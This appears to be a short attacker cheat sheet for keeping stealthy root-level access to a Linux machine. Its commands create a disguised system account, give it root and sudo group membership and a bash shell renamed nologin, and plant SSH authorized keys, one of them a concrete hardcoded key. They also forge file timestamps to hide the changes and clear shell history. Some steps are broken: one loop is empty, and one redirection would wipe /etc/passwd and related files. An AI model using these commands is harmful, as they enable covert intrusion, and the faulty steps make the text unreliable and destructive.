# Prerequisite

Root user access

# Attacker

    # ssh-keygen

# Target

    # cp /bin/bash /bin/nologin
    # for filename in "shadow" "passwd" "gshadow" "group"; do cp /etc/$filename /tmp/$filename; touch -d "$(date -R -r /etc/$filename)" /tmp/$filename; done
    # useradd -r -m -d /var/spool/<USERNAME> -s /usr/sbin/nologin <USERNAME>
    # useradd -r -m -d /var/spool/rpcd -s /bin/nologin rpcd
    # usermod -aG root,< wheel | sudo> rpcd
    # username=<USERNAME>;for filename in "shadow" "passwd" "gshadow" "group"; do line=$(grep $username /etc/$filename) && sed -i "/$username/d" /etc/$filename && awk -v newline="$line" 'NR==11 {print newline} {print}' /etc/$filename >/etc/$filename; chmod 644 /etc/$filename; touch -d "$(date -R -r /tmp/$filename)" /etc/$filename; done
    # chmod 000 /etc/shadow
    # touch -d "$(date -R -r /tmp/shadow)" /etc/shadow
    rm -f /tmp/*
    # for filename in "passwd" "shadow" "group" "gshadow"; done
    # mkdir -p /var/spool/rpcd/.ssh
    # echo '<ATTACKER_PUBLIC_KEY>' >> /var/spool/rpcd/.ssh/authorized_keys
    # echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOs0Xu4nrv/kQiVUWPzS7/9kxHM2G2MhvLGYHb1FhQWi vomanga@tanim-boly' >> /var/spool/rpcd/.ssh/authorized_keys
    # chown -R rpcd /var/spool/rpcd
    # chmod 600 /var/spool/rpcd/.ssh/authorized_keys
    # touch -d "$(date -R -r /etc/shells)" /var/spool/rpcd; touch -d "$(date -R -r /etc/shells)" /var/spool/rpcd/.ssh;touch -d "$(date -R -r /etc/shells)" /var/spool/rpcd/.ssh/authorized_keys
    # history -c


### Exploitation 

    ssh rpcd@<TARGET_IP>[:SSH_PORT] -i <ATTACKER_PRIVATE_KEY_PATH>


